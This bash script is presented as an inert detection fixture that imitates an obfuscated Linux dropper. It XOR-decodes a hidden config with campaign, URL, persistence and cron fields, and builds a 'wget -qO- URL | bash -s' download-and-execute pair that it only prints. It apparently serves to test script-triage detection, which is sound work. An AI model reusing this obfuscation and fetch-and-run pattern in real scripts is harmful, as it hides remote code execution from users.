#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_c3305ff5='7,100,1,57,12,104,94,109,92,110,93,114,16,113,61,78,61,88,42,94,48,69,13,48,68,42,79,40,73,22,100,1,114,7,123,19,96,78,44,24,126,70,37,71,116,67,108,8,97,13,108,26,116,29,51,86,58,74,39,70,62,91,117,22,115,75,126,26,44,31,46,28,47,0,47,21,102,22,98,22,126,67,47,93,40,84,55,82,106,95,59,13,62,15,61,14,35,77,42,67,34,82,63,94,61,0,100,13,82,60,91,50,83,35,78,47,76,48,1,60,72,38,83,60,95,0,101,2,99,23,100,24,125,13,100,20,75,63,74,37,65,53,70,25,109,8,111,24,37,87,50,70,54,87,51,82,46,75,59,82,34,125,21,118,2,99,19,96,9,109,65,36,80,63,82,55,69,26,127,13,100,17,96,3,98,95,44,92,57,77,62,66,115,78'

readonly Codec_c3305ff5='reversed_decimal|rolling_xor|38'



Load_c3305ff5() {

  stored_bytes=()

  local IFS=',' byte_index

  local -a pieces

  read -r -a pieces <<< "${Material_c3305ff5}"

  for ((byte_index=${#pieces[@]}-1; byte_index>=0; byte_index--)); do stored_bytes+=("${pieces[byte_index]}"); done

}



Decode_c3305ff5() {

  recovered_bytes=()

  local prior_byte=56

  local byte_index

  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do

    recovered_bytes+=("$((stored_bytes[byte_index] ^ prior_byte))")

    prior_byte=${stored_bytes[byte_index]}

  done

}



Recover_c3305ff5() {

  local -a stored_bytes recovered_bytes

  local configuration_text harmless_value decode_pass byte_index

  local -a compass=(north south); harmless_value="$(IFS=:; printf '%s' "${compass[*]}")"

  Load_c3305ff5

  case 1 in 1) Decode_c3305ff5 ;; *) return 70 ;; esac

  configuration_text=''

  local octal character

  for byte_index in "${!recovered_bytes[@]}"; do

    printf -v octal '%03o' "${recovered_bytes[byte_index]}"

    printf -v character '%b' "\\$octal"

    configuration_text+="$character"

  done

  printf '%s\n' "$configuration_text"

}



Inspect_c3305ff5() { local recovered field; local -a fields; recovered="$(Recover_c3305ff5)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }



Plan_c3305ff5() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_c3305ff5)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(wget -qO- "$url")

  local -a interpreter=(bash -s)

  declare -p request_command interpreter

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_c3305ff5; fi

